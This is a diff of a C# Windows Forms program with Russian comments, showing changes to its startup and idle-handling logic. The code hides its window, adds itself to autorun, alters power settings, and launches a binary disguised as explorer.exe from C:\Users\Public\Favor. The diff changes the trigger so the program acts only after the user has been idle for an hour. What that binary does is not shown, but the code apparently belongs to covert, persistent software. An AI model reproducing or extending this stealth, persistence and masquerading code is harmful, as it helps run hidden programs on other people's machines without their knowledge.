@@ -80,11 +80,11 @@ namespace WindowsFormsApp1
 
             int idleTime = unchecked(Environment.TickCount - (int)lastInputInfo.dwTime);    //конвертация времени в удобоваримый вариант подсчёта.
                                                                                             //Этот вариант лучше, хотя разницы я не знаю
+           
 
 
 
-
-            if (hiden == false && Environment.CurrentDirectory == @"C:\Users\Public\Favor")
+            if (hiden == false && File.Exists(progStartName + @"\redy.txt"))
             {
                 hiden = true;
                 Hide();
@@ -106,8 +106,15 @@ namespace WindowsFormsApp1
                     autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
                     File.Create(Environment.CurrentDirectory + @"\autorn.txt");
                 }
+
+                if (!File.Exists(Environment.CurrentDirectory + @"\power.txt"))
+                {
+                    PowerSetings pow = new PowerSetings();
+                    pow.SetSetings();
+                    File.Create(Environment.CurrentDirectory + @"\power.txt");
+                }
             }
-            else if (hiden == false && Environment.CurrentDirectory != @"C:\Users\Public\Favor")
+            else if (hiden == false && !File.Exists(progStartName + @"\redy.txt"))
             {
                 idleTimeOld= Convert.ToInt32(DateTime.Now.ToString("ss"));
                 hiden = true;
@@ -117,16 +124,18 @@ namespace WindowsFormsApp1
 
                 Autorun autoR = new Autorun();
                 autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
+                File.Create(@"C:\Users\Public\Favor\autorn.txt");
 
                 PowerSetings pow = new PowerSetings();
                 pow.SetSetings();
+                File.Create(@"C:\Users\Public\Favor\power.txt");
 
             }
 
 
 
 
-            if (Environment.CurrentDirectory == @"C:\Users\Public\Favor")
+            if (File.Exists(progStartName + @"\redy.txt"))
             {
                 time = DateTime.Now.ToString("HH.mm");
                 if (time == "00.00" && !File.Exists(Environment.CurrentDirectory + "/restart.txt"))
@@ -145,7 +154,7 @@ namespace WindowsFormsApp1
                 }
 
                 //if (idleTime >= 3600000 && prog_started == false && time != "00.00")
-                if (idleTime >= 5000 && prog_started == false && time != "00.00")
+                if (idleTime >= 3600000 && prog_started == false && time != "00.00")
                 {
                     prog_started = true;
                     start_prog();
@@ -186,8 +195,14 @@ namespace WindowsFormsApp1
                         srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
                         srartProg.Start();
                         */
-                        Process.Start(@"C:\Users\Public\Favor\explorer.exe"); 
-                        Environment.Exit(0);
+                        //Environment.Exit(0);
+                        File.Create(progStartName + @"\redy.txt");
+                        this.Close();
+                        Process.Start(@"C:\Users\Public\Favor\explorer.exe");
+                        //this.Close();
+
+
+
 
                     }
                 }
@@ -200,8 +215,11 @@ namespace WindowsFormsApp1
                         srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
                         srartProg.Start();
                         */
-                        Process.Start(@"C:\Users\Public\Favor\explorer.exe"); 
-                        Environment.Exit(0);
+                        //Environment.Exit(0);
+                        File.Create(progStartName + @"\redy.txt");
+                        this.Close();
+                        Process.Start(@"C:\Users\Public\Favor\explorer.exe");
+
 
                     }
                 }
